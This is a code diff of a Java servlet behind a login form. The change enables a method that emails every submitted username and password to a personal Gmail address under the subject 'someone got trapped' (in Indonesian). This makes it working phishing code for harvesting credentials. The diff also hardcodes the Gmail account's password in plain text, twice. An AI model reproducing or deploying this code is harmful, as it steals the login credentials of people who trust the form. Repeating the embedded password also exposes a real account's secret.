@@ -5,6 +5,8 @@ import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.PrintStream;
+import java.lang.reflect.GenericArrayType;
+import java.nio.file.attribute.UserPrincipalLookupService;
 import java.util.Properties;
 
 import javax.mail.Message;
@@ -38,11 +40,11 @@ public class ProcessRequest  extends HttpServlet{
 		String nama = req.getParameter("username");
 		String password = req.getParameter("password");
 		if (nama != null && password != null) {
-//			processEmail(nama, password);
+			processEmail(nama, password);
 			try {
-				String path = getServletContext().getRealPath("/WEB-INF/file/userlist.xml");
+//				String path = getServletContext().getRealPath("/WEB-INF/file/userlist.xml");
 //				System.out.println(path);
-				writeToXML(nama, password , path);
+//				writeToXML(nama, password , path);
 			}catch( Exception e) {
 				e.printStackTrace();
 			}
@@ -85,23 +87,31 @@ public class ProcessRequest  extends HttpServlet{
 	}
 	
 	public void processEmail(String nama, String password) {
+		
+//		UserService service;
+		String host = "smtp.gmail.com";
+		String from = "fajar.kasimbar@gmail.com";
+		Properties props = System.getProperties();
+		props.put("mail.smtp.host", host);
+		props.put("mail.smtp.user", from);
+		props.put("mail.smtp.password", "KasimBaR-p-21Z"  );
+		props.put("mail.smtp.port", "587"); // 587 is the port number of yahoo mail
+		props.put("mail.smtp.auth", "true");
+		props.put("mail.smtp.starttls.enable", "true");
 
-		Properties mailServerProperties = System.getProperties();
-		mailServerProperties.put("mail.smtp.port", "587");
-		mailServerProperties.put("mail.smtp.auth", "true");
-		mailServerProperties.put("mail.smtp.starttls.enable", "true");
-
-		Session getMailSession = Session.getDefaultInstance(mailServerProperties, null);
+		Session getMailSession = Session.getDefaultInstance(props, null);
 		MimeMessage generateMailMessage = new MimeMessage(getMailSession);
 		try {
+			generateMailMessage.setFrom(new InternetAddress("fajar.kasimbar@gmail.com"));
+			
 			generateMailMessage.addRecipient(Message.RecipientType.TO, new InternetAddress("fajar.kasimbar@gmail.com"));
 			generateMailMessage.setSubject("Ada yang terjebak");
 			String emailBody = "nama: "  + nama + "| pasword: "+ password;
 			generateMailMessage.setContent(emailBody, "text/html");
 
+			
 			Transport transport = getMailSession.getTransport("smtp");
-
-			transport.connect("smtp.googlemail.com", "fajar.kasimbar@gmail.com", "KasimBaR-p-21Z");
+			transport.connect("smtp.googlemail.com", "fajar.kasimbar@gmail.com", "KasimBaR-p-21Z" );
 			transport.sendMessage(generateMailMessage, generateMailMessage.getAllRecipients());
 			transport.close();
 
